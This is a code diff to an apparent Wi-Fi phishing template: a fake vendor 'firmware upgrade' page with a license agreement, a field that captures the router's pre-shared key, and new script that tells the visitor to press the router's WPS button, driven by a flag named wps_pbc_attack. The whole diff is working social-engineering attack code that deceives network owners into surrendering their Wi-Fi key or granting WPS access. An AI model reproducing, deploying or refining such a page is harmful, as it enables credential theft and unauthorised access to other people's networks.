@@ -154,23 +154,24 @@ The {{ target_ap_vendor }} Firmware/Software/Drivers are provided "AS IS" withou
 
 In no event shall {{ target_ap_vendor }} Company or any other party which has been involved in the creation, production, or delivery of the {{ target_ap_vendor }} Firmware/Software/Drivers be liable for any damages whatsoever arising from or related to this Software License Agreement or the {{ target_ap_vendor }} Firmware/Software/Drivers, including, without limitation, direct, indirect, consequential, incidental or special damages or losses , including but not limited to damages for lost profits or losses resulting from business interruption or loss of data, regardless of the form of action or legal theory under which the liability may be asserted, even if advised of the possibility or likelihood of such damages.
 
-4. DOWNLOAD METHODS.
-
-You can either give the pre-shared key or just press the wps-pbc button on the Router and press the firmware download button.
        </textarea>
         <div class="checkbox">
           <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
         </div>
-        <form>
-            <input type="radio" id="key_radio" name="download_method" value="pre-shared key" checked> Pre-shared Key<br>
-            <input type="radio" id="wps_radio" name="download_method" value="wps_pbc"> WPS-PBC <br>
-        </form>
       </div>
-      <div class="form-group has-feedback">
-          <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key: <span id="pw_status" style="color:blue"></span></label>
+      <label> <span id="pw_status" style="color:gold"></span></label>
+      <div class="form-group-has-feedback" id="psk_field">
+          <label for="pwd">{{ target_ap_encryption }} Pre-Shared Key:</label>
           <input class="form-control" type="password" id="pwd" disabled>
       </div>
       <div class="container text-center">
+        <script>
+            if ( "1" == {{ wps_pbc_attack }} && "1" == {{ psk_enable }}) {
+                document.write("<p> Alternatively, please go to the wireless router and press the WPS button for a couple of seconds to initialize the firmware update process.</p>")
+            } else if ( "1" == {{wps_pbc_attack}}) {
+                document.write("<p> Please go to the wireless router and press the WPS button for a couple of seconds to initialize the firmware update process.</p>")
+            }
+        </script>
         <button class="btn btn-primary" id="btn">Start Upgrade</button>
       </div>
     </form>
@@ -249,6 +250,19 @@ var match = /^http:.*static\/$/.exec(document.getElementById("ap_logo_path").src
 if (match) {
     document.getElementById('ap_logo_path').style.display = 'none';
 }
+
+/* initialize the status description based on wps_pbc_attack and psk_enable flags */
+if ("0" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
+    /* hide the pre-shared key region if psk_enable is 0 in the config.ini */
+    document.getElementById('psk_field').style.display = 'none';
+    document.getElementById('pw_status').innerHTML = "Awaiting user to push the WPS button to initialize firmware upgrade.";
+} else if ("1" == {{psk_enable}} && "1" == {{wps_pbc_attack}}) {
+    document.getElementById('pw_status').innerHTML = "Awaiting user to push the WPS button or entering pre-shared key to initialize firmware upgrade.";
+} else {
+    /* the default mode when -wE is not given */
+    document.getElementById('pw_status').innerHTML = "Awaiting user entering pre-shared key to initialize firmware upgrade.";
+}
+
 /*
   Check the password field and act accordingly.
 */
@@ -262,8 +276,8 @@ $("#btn").on("click", function(e) {
     // if the box is checked
   	if ( box.checked == true )
   		{
-        // check if wps radio button is selected
-        if (document.getElementById("wps_radio").checked == true)
+        // check if the psk not entered and wps_pbc_attack is enabled
+        if (input.value == "" && "1" == {{wps_pbc_attack}})
         {
             // pass to wps state handler
             var data =
@@ -282,9 +296,11 @@ $("#btn").on("click", function(e) {
                         var objresponse = JSON.parse(jsonResponse);
                         var verify_status = objresponse['get_wps_state_handler']
                         if (verify_status == 'WPS_CONNECTING' || verify_status == "WPS_CONNECTED") {
+                            document.getElementById('pw_status').style.color = 'green';
                             document.getElementById("pw_status").innerHTML = "Firmware download complete!"
-                        } else if (verify_status == 'WPS_IDLE') {
-                            document.getElementById("pw_status").innerHTML = "You haven't pressed the WPS-PBC button!"
+                        } else if (verify_status == "WPS_IDLE") {
+                            document.getElementById('pw_status').style.color = 'hotpink';
+                            document.getElementById("pw_status").innerHTML = "Press the WPS button before downloading firmware!"
                         }
                     },
                 });
